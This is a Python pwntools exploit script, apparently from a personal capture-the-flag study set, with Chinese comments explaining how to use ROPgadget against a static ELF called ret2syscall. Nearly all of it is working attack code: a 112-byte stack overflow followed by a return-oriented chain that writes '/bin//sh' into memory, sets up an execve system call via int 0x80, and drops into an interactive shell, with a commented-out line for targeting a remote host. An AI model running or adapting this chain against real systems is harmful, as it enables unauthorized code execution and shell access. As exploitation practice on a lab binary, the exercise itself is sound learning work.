from pwn import *
from struct import pack

'''
    PWN 第三章 System Call
    针对静态（无libc）的ELF，可以使用System Call进行攻击，此时可以借助ROPgadget快速生成payload
        ROPgadget --binary ret2syscall --ropchain
    其中，- Step 5 -- Build the ROP chain即为payload
    将生成的payload植入栈溢出点，然后转换成bytes即可得到完整体
    注意，使用ROPgadget生成payload必须加载struct包，否则将报错退出
        from struct import pack
'''


def ret2_systemcall(file_name='/mnt/hgfs/CyberSecurity/PWN/ROP/ret2syscall'):
    print('call ret2syscall start')
    try:
        io = process([file_name])
        # io = remote('172.53.6.15',10000)

        # io.recvline()
        #
        # io.recvline()

        # ROPgadget --binary ret2syscall --ropchain
        # Padding goes here
        p = b'A' * 112

        p += pack('<I', 0x0806eb6a)  # pop edx ; ret
        p += pack('<I', 0x080ea060)  # @ .data
        p += pack('<I', 0x080bb196)  # pop eax ; ret
        p += b'/bin'
        p += pack('<I', 0x0809a4ad)  # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x0806eb6a)  # pop edx ; ret
        p += pack('<I', 0x080ea064)  # @ .data + 4
        p += pack('<I', 0x080bb196)  # pop eax ; ret
        p += b'//sh'
        p += pack('<I', 0x0809a4ad)  # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x0806eb6a)  # pop edx ; ret
        p += pack('<I', 0x080ea068)  # @ .data + 8
        p += pack('<I', 0x08054590)  # xor eax, eax ; ret
        p += pack('<I', 0x0809a4ad)  # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x080481c9)  # pop ebx ; ret
        p += pack('<I', 0x080ea060)  # @ .data
        p += pack('<I', 0x0806eb91)  # pop ecx ; pop ebx ; ret
        p += pack('<I', 0x080ea068)  # @ .data + 8
        p += pack('<I', 0x080ea060)  # padding without overwrite ebx
        p += pack('<I', 0x0806eb6a)  # pop edx ; ret
        p += pack('<I', 0x080ea068)  # @ .data + 8
        p += pack('<I', 0x08054590)  # xor eax, eax ; ret
        p += pack('<I', 0x0807b5bf)  # inc eax ; ret
        p += pack('<I', 0x0807b5bf)  # inc eax ; ret
        p += pack('<I', 0x0807b5bf)  # inc eax ; ret
        p += pack('<I', 0x0807b5bf)  # inc eax ; ret
        p += pack('<I', 0x0807b5bf)  # inc eax ; ret
        p += pack('<I', 0x0807b5bf)  # inc eax ; ret
        p += pack('<I', 0x0807b5bf)  # inc eax ; ret
        p += pack('<I', 0x0807b5bf)  # inc eax ; ret
        p += pack('<I', 0x0807b5bf)  # inc eax ; ret
        p += pack('<I', 0x0807b5bf)  # inc eax ; ret
        p += pack('<I', 0x0807b5bf)  # inc eax ; ret
        p += pack('<I', 0x08049421)  # int 0x80


        io.sendlineafter('What do you plan to do?' ,p)

        io.interactive()
    except Exception:
        return False
    finally:
        print('call ret2syscall end\n\n')

    return True


if __name__ == '__main__':
    ret2_systemcall()
